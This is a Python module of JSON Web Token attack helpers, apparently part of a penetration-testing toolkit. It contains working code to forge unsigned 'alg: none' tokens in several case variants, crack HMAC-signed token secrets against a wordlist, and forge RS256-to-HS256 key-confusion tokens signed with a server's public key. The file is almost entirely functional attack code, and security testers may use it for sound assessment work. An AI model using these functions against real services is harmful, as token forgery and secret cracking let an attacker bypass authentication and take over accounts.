from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    clean = s.strip()
    padded = clean + "=" * ((4 - len(clean) % 4) % 4)
    return base64.urlsafe_b64decode(padded)


def jwt_forge_none(payload: dict[str, Any], alg_variant: str = "none") -> str:
    """
    Generate an unsigned JWT with `alg: none` (or case variants `None`, `NONE`, `nOnE`)
    and a trailing period for signature-bypass testing.
    """
    header = {"alg": alg_variant, "typ": "JWT"}
    h_enc = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p_enc = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    return f"{h_enc}.{p_enc}."


def jwt_sign_hs256(
    payload: dict[str, Any],
    secret: bytes | str,
    headers: dict[str, Any] | None = None,
) -> str:
    """Sign a JWT payload using HMAC-SHA256 (`HS256`) with the given secret."""
    hdr = {"alg": "HS256", "typ": "JWT"}
    if headers:
        hdr.update(headers)
    key_bytes = secret.encode("utf-8") if isinstance(secret, str) else secret
    h_enc = _b64url_encode(json.dumps(hdr, separators=(",", ":")).encode("utf-8"))
    p_enc = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h_enc}.{p_enc}".encode("ascii")
    sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    return f"{h_enc}.{p_enc}.{_b64url_encode(sig)}"


def jwt_crack_hs256(token: str, wordlist: list[str]) -> str | None:
    """Perform dictionary key recovery against an HS256/HS384/HS512 JWT token."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    header_raw = json.loads(_b64url_decode(parts[0]).decode("utf-8"))
    alg = str(header_raw.get("alg", "HS256")).upper()
    digest_mod = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }.get(alg, hashlib.sha256)

    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    target_sig = _b64url_decode(parts[2])

    for word in wordlist:
        cand_sig = hmac.new(word.encode("utf-8"), signing_input, digest_mod).digest()
        if hmac.compare_digest(cand_sig, target_sig):
            return word
    return None


def jwt_forge_key_confusion(payload: dict[str, Any], public_key_pem: bytes | str) -> str:
    """
    Generate an `RS256 -> HS256` algorithm-confusion JWT signed using the server's RSA
    public key PEM bytes as the symmetric HMAC-SHA256 secret.
    """
    return jwt_sign_hs256(payload, secret=public_key_pem, headers={"alg": "HS256", "typ": "JWT"})
